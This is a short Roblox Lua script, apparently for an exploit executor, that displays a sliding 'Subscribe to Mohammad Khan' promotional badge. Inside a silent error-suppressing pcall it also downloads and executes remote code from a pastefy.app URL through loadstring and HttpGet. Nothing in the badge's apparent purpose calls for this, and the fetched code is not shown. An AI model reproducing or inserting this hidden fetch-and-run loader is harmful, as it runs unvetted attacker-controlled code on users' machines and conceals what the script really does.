local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

pcall(function()
    local parentGui = gethui and gethui() or player:WaitForChild("PlayerGui")

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "SubscribeBadgeGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = parentGui

    local badgeFrame = Instance.new("Frame")
    badgeFrame.Size = UDim2.fromOffset(240, 60)
    badgeFrame.Position = UDim2.new(1, 250, 1, -100) -- start off-screen to the right
    badgeFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    badgeFrame.BorderSizePixel = 0
    badgeFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = badgeFrame

    local shadow = Instance.new("Frame")
    shadow.Size = UDim2.fromScale(1, 1)
    shadow.Position = UDim2.new(0, 0, 0, 0)
    shadow.BackgroundTransparency = 0.9
    shadow.BorderSizePixel = 0
    shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
    shadow.Parent = badgeFrame

    local shadowCorner = Instance.new("UICorner")
    shadowCorner.CornerRadius = UDim.new(0, 12)
    shadowCorner.Parent = shadow

    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.fromOffset(40, 40)
    icon.Position = UDim2.fromOffset(10, 10)
    icon.BackgroundTransparency = 1
    icon.Image = "rbxassetid://6031094678"
    icon.Parent = badgeFrame

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -60, 1, 0)
    textLabel.Position = UDim2.fromOffset(60, 10)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextScaled = true
    textLabel.TextWrapped = true
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.Text = "Subscribe to Mohammad Khan"
    textLabel.Parent = badgeFrame

    TweenService:Create(
        badgeFrame,
        TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        {Position = UDim2.new(1, -260, 1, -100)} -- final position at bottom-right
    ):Play()

    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/YiGY38uo/raw"))()
    end)

    task.delay(4, function()
        TweenService:Create(
            badgeFrame,
            TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
            {Position = UDim2.new(1, 250, 1, -100)}
        ):Play()
        task.wait(0.5)
        screenGui:Destroy()
    end)
end)
